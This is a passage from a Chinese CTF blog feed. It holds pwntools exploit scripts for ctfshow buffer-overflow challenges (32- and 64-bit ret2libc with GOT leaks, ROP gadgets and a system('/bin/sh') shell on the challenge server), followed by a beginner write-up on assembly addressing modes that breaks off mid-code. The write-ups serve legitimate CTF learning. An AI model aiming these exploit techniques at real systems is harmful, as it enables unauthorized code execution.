data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#system=libc_base+libc.sym[\"system\"]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#binsh=libc_base+next(libc.search(b\"/bin/sh\"))</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"O.o?\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6b</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32(write_got)+p32(4)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn46-64位ret2libc\"><a class=\"anchor\" href=\"#pwn46-64位ret2libc\">#</a> pwn46 (64 位 ret2libc)</h1>\n<h2 id=\"题目-12\"><a class=\"anchor\" href=\"#题目-12\">#</a> 题目</h2>\n<p>题目描述： <code>64位 无 system 无 &quot;/bin/sh&quot;</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/13/pipaJ9U.png\" alt=\"\" /></p>\n<p>最初想通过 puts 来泄露地址（因为参数少），但是没有找到正确的 libc 版本，转向利用 write 来泄露</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn46'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#libc=ELF(\"./64libc.so.6\")</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28132</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>main<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>write_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>write_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400803</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rsi_r15_ret<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400801</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#payload=b\"a\"*(0x70+8)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)#+p32(1)+p32(write_got)+p32(4)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi_r15_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32(1)+p32(write_got)+p32(4)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"O.o?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"O.o?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/",
            "url": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/",
            "title": "CTFshow(前置基础部分-汇编,5~34)",
            "date_published": "2023-09-15T03:01:15.000Z",
            "content_html": "<h1 id=\"官方wp\"><a class=\"anchor\" href=\"#官方wp\">#</a> 官方 wp：</h1>\n<p><code>0-36：</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly95c3lucmg3N3JqLmZlaXNodS5jbi9kb2N4L0h3MW1kMGFaU291Y0ZpeEVmNkFjMm90UW53aA==\">https://ysynrh77rj.feishu.cn/docx/Hw1md0aZSoucFixEf6Ac2otQnwh</span></p>\n<p><code>37-72：</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly95c3lucmg3N3JqLmZlaXNodS5jbi9kb2N4L0MxTHZkc1NuWW9OSWVneFZOREVjbHo4M25sZQ==\">https://ysynrh77rj.feishu.cn/docx/C1LvdsSnYoNIegxVNDEclz83nle</span></p>\n<h1 id=\"前置知识\"><a class=\"anchor\" href=\"#前置知识\">#</a> 前置知识：</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU2Njk2Mzc4L2FydGljbGUvZGV0YWlscy8xMjgwNjc0Mzg=\">https://blog.csdn.net/m0_56696378/article/details/128067438</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUYlODQlRTUlQUQlOTglRTUlOTklQTglRTUlQUYlQkIlRTUlOUQlODAlRTYlOTYlQjklRTUlQkMlOEYvNjY4NjQwOA==\">https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/6686408</span></p>\n<h1 id=\"pwn5\"><a class=\"anchor\" href=\"#pwn5\">#</a> pwn5</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfMr7t.png\" alt=\"\" /><br />\n查看查询信息（另一个 asm 文件是用于在 C<ins> 源码中内嵌汇编语言。ASM 能写在任何 C</ins> 合法语句中，asm 还不是 C 的标准关键字）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQC4K.png\" alt=\"\" /></p>\n<p>32 位程序，利用 ida 打开</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQl8S.png\" alt=\"\" /></p>\n<p>发现是 int 0x80，为系统调用，通过系统调用 write 函数来输出，输出结果即为 flag<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQYbn.png\" alt=\"\" /></p>\n<p>【关于 asm，给我们解释了汇编代码的含义】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQB2F.png\" alt=\"\" /><br />\n系统调用（int 0x80）在后面执行，系统调用号在前面</p>\n<h1 id=\"pwn6立即寻址方式\"><a class=\"anchor\" href=\"#pwn6立即寻址方式\">#</a> pwn6（立即寻址方式）</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf1WcD.png\" alt=\"\" /><br />\n32 位程序，让我们计算立即寻址方式后的 eax 的值</p>\n<p>【立即寻址方式是一种操作数寻址方式。在立即寻址方式下，指令的地址字段指出的是操作数本身，而不是操作数的地址。立即寻址方式的特点是指令执行时间很短，因为它不需要访问内存取数，从而节省了访问内存的时间。立即寻址方式常用于指令的源操作数，不能用作目的操作数。例如，MOV AX,5678H 指令中的 5678H 就是一个立即数，作为源操作数直接参与指令的运算。】这意味着，将寄存器不会去将该值当作地址，直接看作一个数值<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf1zHs.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov eax, 0Bh        #eax=0xBh\nadd  eax, 1BF48h #eax=eax+0x1BF48h\nsub   eax, 1             #eax=eax-1\n</code></pre>\n<p>得到 eax=0x1BF52h  (114514)</p>\n<p>所以答案 ctfshow (114514)</p>\n<p>此题 asm<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf39Nq.png\" alt=\"\" /></p>\n<h1 id=\"pwn7寄存器寻址方式\"><a class=\"anchor\" href=\"#pwn7寄存器寻址方式\">#</a> pwn7（寄存器寻址方式）</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3JDH.png\" alt=\"\" /></p>\n<p>【寄存器寻址方式：操作数在 CPU 内部的寄存器中，指令指定寄存器号。，意味着直接取指定寄存器当中的值即可】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3a5t.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ebx, 36Dh  #ebx=0x36Dh\nmov edx, ebx     #edx=ebx \n</code></pre>\n<p 0x36D=\"\">edx=0x36Dh  (877），<br />\nctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3R5q.png\" alt=\"\" /></p>\n<h1 id=\"pwn8直接寻址方式\"><a class=\"anchor\" href=\"#pwn8直接寻址方式\">#</a> pwn8（直接寻址方式）</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3qaR.png\" alt=\"\" /></p>\n<p>【直接寻址方式：在指令中直接给出参与运算的操作数及运算结果所存放的主存地址，即在指令中直接给出有效地址。意味着直接将地址赋值给对应寄存器】</p>\n<p>32 位程序，查看汇编<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3XPx.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, dword_80490E8  #ecx=dword_80490E8 (地址就是0x80490E8)\n</code></pre>\n<p 0x80490E8=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfrBuR.png\" alt=\"\" /></p>\n<h1 id=\"pwn9-间接寻址方式\"><a class=\"anchor\" href=\"#pwn9-间接寻址方式\">#</a> pwn9 （间接寻址方式）</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfrDD1.png\" alt=\"\" /></p>\n<p>【间接寻址方式：间接寻址是在直接寻址的基础上面建立起来的，也就是直接寻址得到的数据是一个地址，通过这个地址找到最终的数据，也就是两次寻址，第一次得到的是地址，第二次才是目标数据】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfsnVx.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov esi,  offset dword_80490E8  #esi=offset dword_80490E8\nmov eax, [esi]  #eax=*esi (取地址内的值，方括号意味着取该地址的值)\n</code></pre>\n<p>利用 ida 查看其中的值</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfsBRg.png\" alt=\"\" /></p>\n<p 0x636C6557=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfs3xH.png\" alt=\"\" /></p>\n<h1 id=\"pwn10寄存器相对寻址方式\"><a class=\"anchor\" href=\"#pwn10寄存器相对寻址方式\">#</a> pwn10（寄存器相对寻址方式）</h1>\n<h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf27an.md.png\" alt=\"\" /></p>\n<p>【寄存器相对寻址方式：操作数的有效地址是一个寄存器和位移量之和。地址是寄存器 + 一个偏移值，具体值在该地址里】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfWmlT.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, offset dword_80490E8   #ecx=dword_80490E8\nadd  ecx, 4   #ecx=ecx+4\nmov eax, [ecx]  #eax=*ecx (取该地址的值)\n</code></pre>\n<p>eax=*(0x80490E8+4)=&quot;ome_to_CTFshow_PWN&quot;</p>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPff3Dg.png\" alt=\"\" /></p>\n<h1 id=\"pwn11基址变址寻址方式\"><a class=\"anchor\" href=\"#pwn11基址变址寻址方式\">#</a> pwn11（基址变址寻址方式）</h1>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPffd2V.png\" alt=\"\" /></p>\n<p>【基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器的内容之和。一般为寄存器直接的运算在赋值】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPffHIA.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, offset dword_80490E8  #exc=0x80490E8\nmov edx, 2   #edx=2\nmov dax,[exc+edx*2]  #ecx=*(0x80490E8+2*2)\n</code></pre>\n<p>ecx=&quot;ome_to_CTFshow_PWN&quot;</p>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf5TZF.png\" alt=\"\" /></p>\n<h1 id=\"pwn12相对基址变址寻址方式\"><a class=\"anchor\" href=\"#pwn12相对基址变址寻址方式\">#</a> pwn12（相对基址变址寻址方式）</h1>\n<h2 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh3Tne.png\" alt=\"\" /></p>\n<p>【相对基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器以及一个位移量之和。一般为两个寄存器 + 一个值】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh3j9P.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov  ecx, offset dword_80490E8  #ecx=80490E8\nmov  edx, 1   #edi=1\nadd   ecx,  8  #ecx=ecx+8\nmov  eax,  [ecx+edx*2-6]  #eax=*(ecx+edx*2-6)\n#eax=*(80490EC)='ome_to_CTFshow_PWN'\n</code></pre>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8uB4.png\" alt=\"\" /></p>\n<h1 id=\"pwn13gcc编译\"><a class=\"anchor\" href=\"#pwn13gcc编译\">#</a> pwn13（gcc 编译）</h1>\n<h2 id=\"题目-9\"><a class=\"anchor\" href=\"#题目-9\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8KHJ.png\" alt=\"\" /></p>\n<p>进行 gcc 编译：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zODA5Mzc5NDY=\">https://zhuanlan.zhihu.com/p/380937946</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc test.c <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">test</span> <span class=\"token comment\">#直接编译成可执行文件（-o 指定输出文件名称，默认 a.out）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./test  <span class=\"token comment\">#运行程序</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8rCt.png\" alt=\"\" /></p>\n<h1 id=\"pwn14\"><a class=\"anchor\" href=\"#pwn14\">#</a> pwn14</h1>\n<h2 id=\"题目-10\"><a class=\"anchor\" href=\"#题目-10\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh86v8.md.png\" alt=\"\" /></p>\n<p>源码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">BUFFER_SIZE</span> <span class=\"token expression\"><span class=\"token number\">1024</span></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span>BUFFER_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    fp <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"key\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nothing here!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">char</span> output<span class=\"token punctuation\">[</span>BUFFER_SIZE <span class=\"token operator\">*</span> <span class=\"token number\">9</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">int</span> offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ctfshow&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BUFFER_SIZE<span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td 